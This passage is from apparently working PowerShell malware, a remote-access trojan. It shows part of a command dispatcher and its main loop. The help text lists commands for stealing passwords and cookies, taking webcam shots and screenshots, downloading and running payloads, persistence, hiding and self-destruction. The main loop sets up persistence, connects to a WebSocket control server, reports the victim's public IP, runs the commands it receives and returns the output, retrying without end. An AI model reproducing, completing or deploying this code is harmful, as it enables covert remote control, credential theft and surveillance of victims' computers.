            return (Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet | 
                   Sort-Object CPU -Descending | 
                   Format-Table -AutoSize | Out-String)
        }
        "kill" {
            if ($args.Count -gt 0) {
                try {
                    Stop-Process -Id $args[0] -Force
                    return "Process $($args[0]) killed"
                } catch {
                    return "Failed: $($_.Exception.Message)"
                }
            }
            return "Usage: /kill <pid>"
        }
        "exit" { return "EXIT_SIGNAL" }
        "help" {
            return @"
Commands: /info /update /exec /ss /webcam /wifi /passwords /cookies /netinfo /ports /arp /volume /tts /play /msg /hidemouse /showmouse /shutdown /flip /shake [sec] /glitch /swapkeys /disablekb /spam /toast /notifyspam /dlexec /dlrun /hide /logout /killsis /wallpaper /persist /processes /kill /selfdestruct /exit
Version: $global:scriptVersion
"@
        }
        default { return "Unknown: /help" }
    }
}

# Initialize
Install-BurntToast | Out-Null
$wasFirstRun = Initialize-Persistence
$persistEnabled = Check-Persistence

# Check for updates on startup
Check-Update

# Main loop with infinite retry
while ($true) {
    try {
        $wssUrl = Get-WssUrl
        
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ct = New-Object System.Threading.CancellationToken
        
        $uri = New-Object System.Uri($wssUrl)
        $connectTask = $ws.ConnectAsync($uri, $ct)
        
        while (-not $connectTask.IsCompleted) {
            Start-Sleep -Milliseconds 100
        }
        
        if ($ws.State -eq 'Open') {
            try {
                $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content
            } catch {
                $publicIP = "Unknown"
            }
            
            $autoStartMsg = if ($wasFirstRun) { " | AUTO-PERSISTENCE ENABLED" } else { "" }
            $initMsg = "UID:$global:uid CONNECTED | IP: $publicIP | Version: $global:scriptVersion | Persist: $persistEnabled$autoStartMsg"
            $initBytes = [System.Text.Encoding]::UTF8.GetBytes($initMsg)
            $sendTask = $ws.SendAsync([System.ArraySegment[byte]]::new($initBytes), 'Text', $true, $ct)
            $sendTask.Wait()
            
            while ($ws.State -eq 'Open') {
                $buffer = New-Object byte[] 32768
                $segment = [System.ArraySegment[byte]]::new($buffer)
                $receiveTask = $ws.ReceiveAsync($segment, $ct)
                
                while (-not $receiveTask.IsCompleted) {
                    Start-Sleep -Milliseconds 100
                }
                
                $result = $receiveTask.Result
                
                if ($result.MessageType -eq 'Text') {
                    $receivedMsg = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
                    
                    $response = Process-Command -message $receivedMsg
                    
                    if ($response -eq "EXIT_SIGNAL") {
                        $ws.CloseAsync('NormalClosure', 'Exit', $ct).Wait()
                        exit
                    }
                    
                    if ($response) {
                        $responseMsg = "[$global:uid] $response"
                        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseMsg)
                        
                        $sendSegment = [System.ArraySegment[byte]]::new($responseBytes)
                        $sendTask = $ws.SendAsync($sendSegment, 'Text', $true, $ct)
                        $sendTask.Wait()
                    }
                }
            }
        }
        
        $ws.Dispose()
        
    } catch {
        # Connection failed, wait before retry
    }
    
    # Wait 30s before reconnecting
    Start-Sleep -Seconds 30
}
